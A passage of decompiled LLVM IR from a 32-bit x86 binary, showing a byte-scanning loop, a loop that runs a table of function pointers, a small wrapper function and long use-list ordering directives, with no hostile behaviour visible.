  %v2_8052437 = zext i1 %v8_8052394.lcssa to i32
  %v3_8052437 = add i32 %v0_8052435, 1
  %v4_8052437 = add i32 %v3_8052437, %v2_8052437
  br label %dec_label_pc_805243f

dec_label_pc_805243c:                             ; preds = %dec_label_pc_80523d0, %dec_label_pc_8052370
  br label %dec_label_pc_805243f

dec_label_pc_805243f:                             ; preds = %dec_label_pc_8052430, %dec_label_pc_805243c
  %storemerge = phi i32 [ %v4_8052437, %dec_label_pc_8052430 ], [ -1, %dec_label_pc_805243c ]
  store i32 %v0_8052372, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80523ed.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_8052424, { 1, 0 }
  uselistorder i32 %v2_80523c7, { 0, 2, 1 }
  uselistorder i32 %v4_80523b8, { 0, 2, 1 }
  uselistorder i32 %v5_805242437, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8 1, { 0, 5, 8, 1, 7, 6, 4, 2, 3 }
  uselistorder i8 46, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 (i16*, i32, i32)* @function_804d150, { 1, 2, 3, 4, 6, 7, 14, 9, 10, 15, 16, 18, 8, 5, 11, 12, 13, 17, 0 }
  uselistorder i32* @edi, { 2, 70, 71, 21, 72, 73, 74, 20, 75, 142, 143, 76, 3, 77, 0, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 23, 5, 4, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 93, 6, 94, 7, 95, 96, 97, 98, 103, 104, 1, 99, 100, 101, 102, 201, 8, 202, 203, 204, 105, 106, 107, 108, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 38, 39, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 9, 216, 217, 218, 219, 220, 221, 222, 260, 261, 10, 262, 263, 11, 266, 267, 52, 53, 268, 269, 270, 271, 272, 273, 22, 274, 283, 284, 57, 12, 58, 59, 60, 40, 41, 42, 43, 44, 45, 46, 61, 13, 62, 63, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 14, 196, 197, 198, 199, 200, 125, 126, 15, 127, 128, 129, 130, 131, 132, 133, 109, 110, 111, 112, 223, 224, 16, 225, 226, 227, 281, 282, 228, 229, 230, 17, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 134, 135, 136, 137, 154, 155, 156, 231, 232, 233, 234, 235, 236, 237, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 18, 252, 47, 48, 49, 238, 19, 239, 240, 277, 278, 279, 280, 157, 158, 159, 160, 161, 162, 54, 55, 56, 253, 254, 255, 256, 163, 164, 165, 168, 169, 170, 264, 265, 64, 65, 275, 276, 166, 167, 50, 51, 66, 67, 68, 69, 138, 139, 140, 141, 171, 172, 257, 258, 259 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 6, 7, 51, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 50, 18, 19, 20, 23, 21, 22, 24, 25, 26, 45, 46, 27, 47, 52, 57, 53, 28, 29, 58, 30, 31, 0, 55, 56, 48, 32, 49, 33, 34, 35, 59, 36, 37, 38, 39, 40, 41, 42, 43, 54, 44 }
  uselistorder i8 64, { 0, 6, 2, 3, 7, 8, 4, 5, 1 }
  uselistorder i1 true, { 0, 5, 6, 1, 2, 3, 4 }
  uselistorder i32* @edx, { 6, 40, 41, 42, 43, 44, 45, 46, 47, 19, 2, 51, 49, 50, 1, 52, 53, 54, 55, 56, 57, 58, 59, 21, 22, 23, 24, 25, 60, 61, 62, 63, 64, 65, 66, 72, 67, 68, 69, 70, 71, 3, 20, 185, 186, 187, 188, 189, 190, 191, 233, 73, 74, 76, 75, 4, 77, 78, 79, 80, 81, 7, 26, 192, 193, 104, 105, 8, 106, 107, 108, 194, 195, 196, 197, 198, 199, 200, 235, 236, 237, 238, 9, 239, 240, 242, 119, 243, 120, 28, 29, 27, 244, 245, 103, 121, 247, 248, 250, 249, 118, 30, 124, 125, 10, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 11, 139, 140, 122, 123, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 12, 178, 179, 180, 181, 182, 183, 184, 82, 83, 85, 86, 87, 35, 5, 13, 48, 84, 201, 88, 89, 14, 90, 109, 110, 111, 91, 92, 93, 94, 112, 202, 203, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 18, 221, 222, 204, 223, 15, 224, 225, 227, 16, 228, 229, 230, 231, 232, 31, 17, 226, 246, 113, 114, 115, 241, 234, 251, 0, 32, 33, 34, 36, 37, 38, 39, 95, 96, 97, 98, 99, 100, 101, 102, 116, 117, 252 }
  uselistorder i32* @esi, { 77, 78, 79, 80, 81, 82, 33, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 34, 38, 39, 9, 7, 40, 41, 42, 43, 44, 45, 103, 10, 104, 105, 109, 106, 107, 108, 116, 110, 111, 112, 113, 114, 115, 117, 118, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 11, 243, 244, 12, 119, 120, 121, 13, 122, 123, 128, 129, 130, 131, 132, 133, 134, 135, 1, 136, 137, 138, 139, 140, 141, 142, 143, 46, 47, 48, 307, 308, 309, 310, 144, 145, 245, 246, 247, 248, 0, 249, 58, 59, 311, 312, 313, 314, 37, 315, 316, 317, 325, 326, 327, 328, 63, 64, 65, 66, 67, 68, 69, 318, 323, 324, 49, 50, 51, 52, 70, 71, 72, 2, 73, 74, 75, 53, 54, 55, 56, 205, 209, 14, 210, 211, 212, 213, 214, 215, 216, 206, 207, 208, 217, 218, 219, 220, 221, 222, 223, 3, 224, 225, 226, 227, 15, 228, 35, 229, 230, 231, 232, 146, 147, 148, 151, 152, 153, 154, 329, 16, 330, 331, 124, 125, 126, 127, 250, 17, 251, 36, 30, 149, 150, 155, 156, 338, 339, 252, 253, 254, 255, 256, 257, 258, 157, 158, 159, 160, 161, 162, 163, 175, 18, 8, 176, 177, 178, 179, 180, 19, 31, 181, 182, 183, 184, 185, 164, 165, 166, 167, 168, 169, 186, 20, 187, 188, 259, 260, 261, 262, 22, 263, 4, 265, 266, 267, 268, 21, 269, 270, 264, 271, 272, 273, 274, 5, 275, 276, 277, 278, 279, 280, 32, 23, 281, 282, 24, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 25, 300, 301, 302, 26, 57, 283, 6, 284, 285, 319, 320, 321, 322, 332, 333, 334, 335, 336, 337, 189, 190, 191, 192, 27, 193, 194, 195, 196, 60, 61, 62, 303, 304, 305, 306, 197, 198, 199, 200, 201, 28, 29, 202, 203, 173, 174, 76, 170, 171, 172, 204, 340 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_805243f, { 1, 0 }
  uselistorder label %dec_label_pc_8052404, { 1, 0 }
}

define i32 @function_8052448(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052448:
  %v1_8052456 = icmp eq i32 %arg1, 0
  br i1 %v1_8052456, label %dec_label_pc_8052485, label %dec_label_pc_8052476.preheader

dec_label_pc_8052476.preheader:                   ; preds = %dec_label_pc_8052448
  store i32 %arg2, i32* @ecx, align 4
  %v2_805247610 = add i32 %arg2, %arg1
  %v3_805247611 = inttoptr i32 %v2_805247610 to i8*
  %v4_805247612 = load i8, i8* %v3_805247611, align 1
  %v1_805247a14 = add i32 %arg2, 1
  %v1_805247d15 = icmp eq i8 %v4_805247612, 0
  %v1_805247f16 = icmp eq i1 %v1_805247d15, false
  br i1 %v1_805247f16, label %dec_label_pc_8052465, label %dec_label_pc_8052481

dec_label_pc_805245c:                             ; preds = %dec_label_pc_8052465
  %v1_805245c = add i32 %v0_805245c17, 2
  br label %dec_label_pc_8052481

dec_label_pc_8052465:                             ; preds = %dec_label_pc_8052476.preheader, %dec_label_pc_8052476
  %v1_805247a19 = phi i32 [ %v1_805247a, %dec_label_pc_8052476 ], [ %v1_805247a14, %dec_label_pc_8052476.preheader ]
  %v5_805247618.in = phi i8 [ %v4_8052476, %dec_label_pc_8052476 ], [ %v4_805247612, %dec_label_pc_8052476.preheader ]
  %v0_805245c17 = phi i32 [ %v2_8052473, %dec_label_pc_8052476 ], [ %arg2, %dec_label_pc_8052476.preheader ]
  %v5_805247618 = zext i8 %v5_805247618.in to i32
  %v1_8052467 = and i32 %v5_805247618, 192
  %v6_805246c = icmp eq i32 %v1_8052467, 192
  %v2_8052473 = add i32 %v5_805247618, %v1_805247a19
  br i1 %v6_805246c, label %dec_label_pc_805245c, label %dec_label_pc_8052476

dec_label_pc_8052476:                             ; preds = %dec_label_pc_8052465
  store i32 %v2_8052473, i32* @ecx, align 4
  %v2_8052476 = add i32 %v2_8052473, %arg1
  %v3_8052476 = inttoptr i32 %v2_8052476 to i8*
  %v4_8052476 = load i8, i8* %v3_8052476, align 1
  %v1_805247a = add i32 %v2_8052473, 1
  %v1_805247d = icmp eq i8 %v4_8052476, 0
  %v1_805247f = icmp eq i1 %v1_805247d, false
  br i1 %v1_805247f, label %dec_label_pc_8052465, label %dec_label_pc_8052481

dec_label_pc_8052481:                             ; preds = %dec_label_pc_8052476.preheader, %dec_label_pc_8052476, %dec_label_pc_805245c
  %v0_8052481 = phi i32 [ %v1_805245c, %dec_label_pc_805245c ], [ %v1_805247a14, %dec_label_pc_8052476.preheader ], [ %v1_805247a, %dec_label_pc_8052476 ]
  %v2_8052483 = sub i32 %v0_8052481, %arg2
  br label %dec_label_pc_8052485

dec_label_pc_8052485:                             ; preds = %dec_label_pc_8052448, %dec_label_pc_8052481
  %v0_8052488 = phi i32 [ -1, %dec_label_pc_8052448 ], [ %v2_8052483, %dec_label_pc_8052481 ]
  ret i32 %v0_8052488

; uselistorder directives
  uselistorder i8 %v4_8052476, { 1, 0 }
  uselistorder i32 %v2_8052473, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 2, { 87, 19, 88, 18, 52, 92, 93, 21, 25, 24, 89, 94, 95, 96, 77, 97, 98, 99, 100, 101, 102, 79, 26, 80, 81, 32, 103, 104, 27, 53, 33, 118, 34, 28, 119, 48, 105, 106, 107, 108, 78, 109, 110, 1, 40, 37, 120, 121, 49, 2, 41, 42, 50, 128, 38, 76, 0, 54, 72, 55, 73, 56, 74, 35, 3, 84, 22, 57, 4, 5, 6, 7, 117, 8, 9, 51, 10, 58, 111, 112, 113, 114, 29, 43, 85, 36, 90, 91, 11, 129, 44, 30, 31, 122, 123, 39, 12, 13, 124, 23, 14, 125, 15, 45, 126, 127, 116, 130, 82, 59, 83, 61, 60, 63, 62, 46, 65, 47, 64, 86, 16, 67, 17, 66, 75, 20, 115, 69, 68, 70, 71 }
  uselistorder i8 0, { 26, 3, 6, 7, 27, 5, 4, 62, 63, 64, 9, 71, 66, 67, 8, 69, 70, 68, 23, 72, 0, 1, 40, 41, 73, 74, 25, 75, 10, 12, 43, 42, 11, 28, 76, 77, 103, 126, 127, 15, 83, 79, 80, 78, 13, 81, 82, 14, 24, 84, 85, 86, 87, 88, 89, 90, 91, 92, 17, 45, 44, 16, 46, 47, 104, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 2, 144, 145, 146, 169, 147, 170, 173, 53, 29, 37, 54, 18, 172, 116, 117, 118, 119, 120, 121, 122, 123, 124, 30, 125, 56, 19, 65, 148, 149, 38, 150, 93, 94, 95, 105, 106, 107, 108, 109, 151, 152, 153, 154, 155, 156, 157, 20, 158, 159, 21, 160, 161, 162, 163, 164, 165, 166, 167, 48, 171, 110, 111, 112, 168, 113, 114, 49, 50, 51, 52, 55, 57, 58, 59, 60, 61, 96, 97, 98, 99, 100, 101, 102, 115, 174, 175, 22, 39, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* @ecx, { 24, 4, 6, 23, 5, 44, 47, 12, 48, 49, 50, 51, 13, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 33, 34, 35, 36, 37, 38, 68, 69, 7, 8, 39, 0, 85, 136, 196, 10, 16, 70, 71, 14, 9, 15, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 1, 40, 137, 138, 29, 139, 86, 87, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 25, 165, 166, 167, 168, 169, 170, 26, 171, 22, 197, 198, 199, 200, 28, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 17, 115, 90, 91, 92, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 18, 130, 131, 133, 134, 135, 132, 82, 45, 46, 172, 30, 31, 83, 88, 173, 174, 175, 176, 177, 178, 179, 27, 180, 11, 181, 182, 183, 184, 185, 19, 20, 2, 3, 186, 187, 21, 188, 189, 190, 191, 192, 194, 195, 41, 42, 193, 201, 89, 43, 202, 84, 32 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052485, { 1, 0 }
  uselistorder label %dec_label_pc_8052481, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052465, { 1, 0 }
}

define i32 @function_8052490() local_unnamed_addr {
dec_label_pc_8052490:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805249c = load i32, i32* @global_var_8055ce8.174, align 8
  %v10_80524a1 = icmp eq i32 %v0_805249c, -1
  br i1 %v10_80524a1, label %dec_label_pc_80524b2, label %dec_label_pc_80524a6.preheader

dec_label_pc_80524a6.preheader:                   ; preds = %dec_label_pc_8052490
  br label %dec_label_pc_80524a6

dec_label_pc_80524a6:                             ; preds = %dec_label_pc_80524a6.preheader, %dec_label_pc_80524a6
  %v4_80524a9 = phi i32 [ %v0_805249c, %dec_label_pc_80524a6.preheader ], [ %v2_80524ab, %dec_label_pc_80524a6 ]
  %v0_80524a6 = phi i32 [ ptrtoint (i32* @global_var_8055ce8.174 to i32), %dec_label_pc_80524a6.preheader ], [ %v1_80524a6, %dec_label_pc_80524a6 ]
  %v1_80524a6 = add i32 %v0_80524a6, -4
  call void @__pseudo_call(i32 %v4_80524a9)
  %v1_80524ab = inttoptr i32 %v1_80524a6 to i32*
  %v2_80524ab = load i32, i32* %v1_80524ab, align 4
  %v10_80524ad = icmp eq i32 %v2_80524ab, -1
  %v1_80524b0 = icmp eq i1 %v10_80524ad, false
  br i1 %v1_80524b0, label %dec_label_pc_80524a6, label %dec_label_pc_80524b2.loopexit

dec_label_pc_80524b2.loopexit:                    ; preds = %dec_label_pc_80524a6
  %v2_80524b2.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_80524b2

dec_label_pc_80524b2:                             ; preds = %dec_label_pc_80524b2.loopexit, %dec_label_pc_8052490
  %v2_80524b2 = phi i32 [ %v2_80524b2.pre, %dec_label_pc_80524b2.loopexit ], [ %tmp6, %dec_label_pc_8052490 ]
  ret i32 %v2_80524b2

; uselistorder directives
  uselistorder i32 %v0_805249c, { 1, 0 }
  uselistorder i1 false, { 438, 148, 4, 0, 1, 6, 149, 151, 150, 5, 153, 152, 154, 28, 8, 29, 163, 158, 162, 160, 161, 36, 155, 156, 159, 7, 164, 165, 166, 167, 53, 55, 56, 57, 58, 54, 59, 60, 61, 62, 63, 64, 168, 169, 174, 30, 170, 171, 173, 172, 175, 176, 181, 180, 177, 178, 179, 9, 10, 65, 66, 67, 37, 182, 183, 184, 256, 257, 258, 324, 325, 326, 259, 31, 260, 261, 327, 328, 329, 289, 108, 32, 12, 185, 186, 187, 188, 190, 189, 11, 191, 192, 33, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 208, 207, 13, 68, 69, 70, 71, 330, 331, 332, 209, 210, 262, 263, 264, 333, 334, 335, 336, 337, 338, 339, 47, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 439, 440, 35, 367, 38, 368, 369, 370, 290, 291, 292, 99, 441, 455, 456, 457, 458, 459, 462, 39, 463, 464, 461, 454, 442, 72, 109, 110, 111, 112, 113, 114, 443, 444, 126, 127, 128, 129, 130, 131, 14, 115, 15, 116, 117, 286, 73, 447, 448, 449, 450, 451, 452, 453, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 293, 306, 307, 308, 309, 310, 311, 312, 313, 26, 315, 314, 319, 316, 317, 318, 16, 320, 321, 211, 212, 214, 215, 137, 2, 3, 140, 139, 138, 17, 460, 157, 371, 372, 373, 40, 374, 18, 213, 216, 375, 376, 217, 218, 219, 220, 221, 222, 267, 265, 266, 19, 34, 268, 270, 269, 41, 271, 273, 272, 42, 274, 223, 224, 275, 100, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 396, 395, 20, 397, 398, 399, 400, 401, 403, 27, 404, 402, 405, 407, 406, 21, 408, 409, 411, 410, 43, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 74, 75, 445, 44, 446, 22, 276, 277, 278, 279, 280, 101, 45, 102, 103, 104, 105, 106, 107, 436, 281, 282, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 118, 119, 120, 121, 122, 123, 124, 125, 132, 133, 134, 135, 136, 141, 142, 143, 144, 145, 146, 147, 225, 226, 227, 49, 24, 228, 229, 230, 231, 232, 233, 50, 23, 234, 235, 236, 51, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 25, 248, 249, 250, 251, 252, 48, 253, 254, 255, 283, 284, 285, 287, 288, 322, 323, 437, 465, 52, 46, 466 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 5, 20, 34, 35, 36, 37, 40, 41, 42, 43, 2, 44, 0, 39, 45, 46, 47, 48, 49, 50, 6, 38, 51, 52, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 4, 33, 7, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 29, 30, 63, 10, 157, 168, 15, 280, 64, 169, 65, 170, 281, 66, 67, 171, 68, 31, 20, 69, 24, 172, 173, 32, 33, 34, 72, 71, 70, 174, 125, 126, 19, 18, 17, 175, 176, 278, 73, 177, 5, 282, 178, 283, 284, 179, 180, 285, 158, 74, 181, 302, 182, 183, 184, 75, 185, 0, 186, 187, 188, 189, 190, 286, 36, 287, 37, 288, 289, 191, 145, 146, 147, 137, 139, 140, 141, 142, 143, 144, 138, 6, 136, 127, 192, 133, 134, 135, 148, 132, 149, 150, 151, 152, 153, 154, 155, 128, 131, 35, 194, 193, 61, 7, 195, 196, 290, 291, 38, 16, 76, 197, 58, 198, 303, 199, 77, 78, 200, 79, 201, 159, 202, 80, 203, 204, 156, 82, 81, 205, 206, 207, 84, 83, 85, 208, 209, 39, 11, 210, 211, 86, 87, 212, 59, 60, 213, 88, 89, 214, 90, 215, 91, 216, 92, 217, 93, 218, 94, 219, 95, 220, 96, 221, 97, 222, 98, 223, 99, 224, 100, 225, 101, 226, 102, 227, 103, 228, 104, 229, 40, 230, 62, 105, 106, 231, 232, 233, 234, 235, 236, 108, 107, 109, 237, 110, 238, 21, 239, 160, 240, 308, 241, 242, 41, 299, 300, 44, 43, 45, 46, 25, 47, 111, 48, 243, 42, 301, 8, 292, 295, 112, 244, 113, 304, 245, 246, 293, 294, 247, 296, 297, 309, 114, 115, 248, 249, 250, 22, 251, 252, 253, 12, 254, 13, 305, 306, 14, 255, 256, 307, 2, 49, 50, 1, 257, 166, 167, 258, 161, 259, 9, 129, 130, 116, 298, 260, 117, 261, 118, 262, 119, 263, 120, 264, 121, 265, 122, 266, 123, 267, 124, 268, 51, 279, 269, 52, 3, 4, 162, 163, 164, 53, 270, 54, 271, 272, 23, 273, 26, 27, 28, 55, 56, 57, 274, 275, 276, 277, 165 }
  uselistorder i32 1, { 377, 675, 223, 619, 676, 218, 677, 45, 678, 253, 679, 680, 59, 681, 378, 24, 380, 379, 166, 211, 254, 255, 682, 225, 685, 344, 686, 687, 688, 224, 689, 236, 366, 14, 13, 690, 691, 382, 381, 182, 692, 383, 693, 384, 168, 694, 695, 385, 172, 173, 623, 624, 625, 626, 627, 628, 629, 630, 631, 390, 389, 388, 387, 386, 43, 42, 41, 44, 632, 633, 634, 393, 392, 391, 104, 106, 105, 107, 109, 108, 284, 696, 697, 212, 364, 698, 699, 256, 700, 307, 701, 702, 394, 32, 0, 1, 706, 703, 704, 705, 226, 395, 69, 68, 635, 636, 637, 257, 638, 707, 708, 709, 396, 179, 178, 176, 180, 177, 309, 710, 125, 258, 259, 122, 123, 121, 124, 260, 397, 18, 285, 237, 399, 398, 22, 23, 400, 187, 401, 53, 286, 287, 402, 288, 289, 403, 311, 404, 213, 711, 712, 220, 713, 261, 227, 228, 714, 715, 219, 717, 718, 719, 720, 721, 262, 407, 406, 405, 722, 723, 724, 725, 726, 727, 728, 729, 217, 238, 730, 263, 731, 732, 733, 264, 734, 735, 265, 736, 737, 738, 739, 740, 312, 410, 409, 408, 20, 19, 21, 290, 291, 741, 742, 743, 744, 229, 639, 640, 641, 27, 411, 821, 412, 30, 31, 292, 766, 367, 200, 308, 822, 823, 824, 266, 313, 825, 413, 826, 267, 827, 828, 425, 424, 423, 422, 421, 420, 419, 418, 417, 416, 415, 414, 190, 191, 193, 194, 198, 196, 192, 197, 195, 199, 829, 830, 2, 131, 130, 129, 128, 127, 426, 183, 184, 427, 73, 74, 831, 832, 428, 145, 144, 146, 866, 867, 868, 71, 72, 70, 429, 833, 430, 62, 66, 67, 63, 65, 64, 834, 293, 433, 432, 431, 434, 46, 435, 47, 436, 437, 112, 48, 438, 29, 440, 439, 28, 441, 201, 442, 49, 443, 203, 444, 202, 445, 167, 446, 447, 25, 448, 36, 450, 449, 26, 451, 15, 452, 54, 113, 454, 453, 163, 455, 459, 458, 457, 456, 119, 871, 872, 873, 461, 460, 58, 57, 874, 294, 463, 462, 465, 464, 171, 295, 352, 615, 239, 471, 470, 469, 468, 467, 466, 161, 162, 869, 474, 473, 472, 118, 116, 117, 314, 475, 664, 665, 666, 347, 667, 476, 140, 141, 142, 139, 143, 296, 477, 60, 61, 659, 214, 221, 660, 368, 478, 96, 98, 95, 97, 479, 83, 81, 79, 80, 85, 84, 82, 90, 87, 89, 91, 86, 88, 315, 481, 480, 316, 482, 317, 483, 318, 486, 485, 484, 353, 489, 488, 487, 185, 319, 788, 789, 790, 490, 165, 791, 792, 230, 793, 794, 795, 94, 92, 93, 354, 787, 268, 204, 206, 205, 320, 796, 797, 798, 799, 800, 801, 802, 803, 804, 269, 805, 806, 807, 808, 809, 299, 810, 811, 210, 300, 812, 813, 814, 815, 297, 298, 816, 817, 818, 493, 492, 491, 136, 135, 134, 138, 137, 355, 494, 495, 496, 497, 498, 499, 500, 501, 745, 240, 746, 321, 251, 322, 750, 241, 506, 505, 504, 503, 502, 11, 12, 507, 508, 669, 670, 671, 231, 301, 672, 511, 510, 509, 10, 512, 716, 513, 164, 683, 684, 835, 836, 376, 514, 126, 837, 747, 748, 749, 516, 515, 8, 7, 6, 751, 752, 517, 78, 77, 76, 876, 518, 34, 35, 33, 519, 520, 302, 753, 754, 755, 369, 110, 111, 767, 768, 769, 270, 16, 323, 324, 325, 770, 521, 326, 327, 771, 271, 3, 523, 522, 189, 328, 756, 757, 524, 207, 208, 329, 525, 120, 303, 526, 9, 838, 839, 616, 273, 840, 841, 842, 843, 844, 846, 847, 848, 274, 849, 850, 356, 272, 851, 275, 852, 853, 854, 845, 530, 529, 528, 527, 155, 157, 156, 152, 154, 153, 158, 855, 531, 150, 147, 149, 148, 276, 532, 856, 857, 534, 533, 159, 160, 858, 859, 244, 243, 235, 860, 304, 861, 862, 242, 863, 277, 864, 330, 865, 536, 535, 37, 39, 38, 40, 278, 331, 4, 332, 537, 538, 133, 132, 870, 540, 539, 174, 175, 305, 875, 541, 181, 333, 209, 334, 772, 773, 774, 775, 776, 777, 778, 779, 252, 780, 545, 544, 543, 542, 100, 101, 335, 279, 336, 337, 310, 345, 549, 548, 547, 546, 114, 338, 552, 551, 550, 555, 554, 553, 17, 556, 339, 781, 782, 340, 341, 783, 558, 557, 560, 559, 99, 561, 75, 562, 115, 564, 563, 151, 565, 55, 566, 186, 567, 188, 568, 103, 642, 643, 644, 645, 646, 306, 569, 575, 574, 573, 572, 571, 570, 169, 170, 647, 648, 649, 222, 650, 651, 652, 653, 654, 655, 656, 657, 658, 370, 661, 357, 358, 371, 580, 579, 578, 372, 577, 576, 56, 662, 663, 359, 360, 617, 586, 373, 585, 584, 374, 583, 582, 581, 102, 668, 342, 361, 587, 618, 362, 593, 592, 591, 590, 589, 588, 673, 215, 216, 674, 245, 595, 594, 52, 246, 247, 248, 249, 758, 759, 280, 233, 760, 761, 762, 620, 281, 232, 763, 764, 621, 363, 601, 600, 599, 598, 597, 596, 50, 51, 282, 602, 283, 765, 622, 343, 365, 608, 607, 606, 605, 604, 603, 784, 785, 786, 609, 375, 234, 250, 346, 819, 5, 820, 610, 348, 877, 878, 349, 879, 880, 350, 351, 881, 882, 611, 613, 612, 614 }
  uselistorder label %dec_label_pc_80524a6, { 1, 0 }
}

define i32 @function_80524b8() local_unnamed_addr {
entry:
  %v0_80524bb = load i32, i32* @ebx, align 4
  %v1_80524bc = call i32 @function_80480b0(i32 %v0_80524bb)
  store i32 %v1_80524bc, i32* @eax, align 4
  %v0_80524c7 = call i32 @function_80480c0()
  ret i32 %v0_80524c7

; uselistorder directives
  uselistorder i32* @eax, { 15, 2, 46, 119, 4, 120, 121, 3, 122, 0, 45, 1, 118, 123, 47, 124, 83, 84, 85, 58, 86, 125, 127, 126, 7, 8, 188, 189, 178, 199, 128, 48, 129, 49, 130, 131, 132, 50, 133, 5, 51, 52, 134, 135, 53, 136, 54, 137, 138, 55, 78, 79, 139, 140, 141, 142, 80, 143, 144, 145, 146, 56, 153, 18, 201, 202, 81, 203, 204, 206, 82, 207, 9, 205, 12, 14, 200, 100, 16, 87, 88, 175, 89, 179, 181, 182, 180, 183, 184, 186, 187, 185, 147, 57, 110, 111, 112, 113, 114, 10, 154, 155, 156, 67, 157, 158, 159, 160, 161, 148, 149, 162, 163, 92, 93, 190, 192, 191, 193, 194, 196, 90, 195, 164, 165, 68, 166, 167, 94, 95, 96, 19, 20, 97, 21, 98, 99, 168, 69, 70, 169, 71, 170, 72, 73, 171, 91, 17, 22, 23, 24, 25, 101, 26, 27, 102, 28, 29, 30, 31, 103, 32, 33, 104, 34, 35, 105, 36, 37, 38, 39, 106, 40, 107, 108, 109, 41, 42, 43, 44, 115, 116, 117, 76, 77, 6, 150, 59, 60, 151, 152, 61, 62, 63, 64, 65, 66, 172, 74, 173, 75, 174, 176, 177, 208, 197, 198, 11, 13 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 571, 13, 14, 15, 46, 381, 572, 575, 573, 574, 382, 41, 700, 764, 765, 18, 48, 578, 586, 580, 581, 19, 39, 582, 583, 584, 383, 585, 47, 100, 101, 102, 576, 577, 109, 587, 588, 590, 591, 589, 592, 218, 593, 594, 595, 596, 597, 598, 110, 111, 384, 257, 258, 87, 464, 385, 465, 466, 51, 52, 467, 468, 469, 375, 470, 50, 386, 49, 387, 112, 0, 1, 388, 113, 114, 389, 390, 391, 115, 392, 601, 393, 599, 205, 600, 259, 260, 116, 2, 3, 394, 602, 603, 604, 605, 606, 261, 395, 396, 20, 53, 472, 88, 89, 397, 607, 54, 398, 21, 117, 766, 262, 701, 702, 703, 767, 768, 12, 219, 119, 118, 769, 770, 220, 771, 772, 120, 121, 399, 704, 122, 705, 400, 773, 401, 774, 775, 776, 777, 608, 735, 123, 402, 4, 471, 5, 897, 519, 520, 124, 263, 609, 610, 611, 613, 95, 22, 614, 55, 615, 616, 617, 618, 619, 620, 626, 627, 628, 629, 621, 622, 623, 624, 625, 56, 57, 403, 630, 631, 58, 59, 60, 404, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 125, 650, 651, 126, 652, 653, 654, 61, 96, 221, 103, 405, 97, 778, 127, 779, 23, 98, 90, 780, 192, 128, 781, 91, 782, 706, 707, 708, 222, 709, 406, 783, 264, 784, 785, 786, 787, 788, 789, 790, 791, 129, 407, 792, 793, 794, 795, 130, 796, 408, 131, 191, 265, 132, 409, 410, 411, 223, 797, 798, 799, 800, 224, 208, 209, 801, 802, 803, 804, 805, 806, 412, 225, 807, 133, 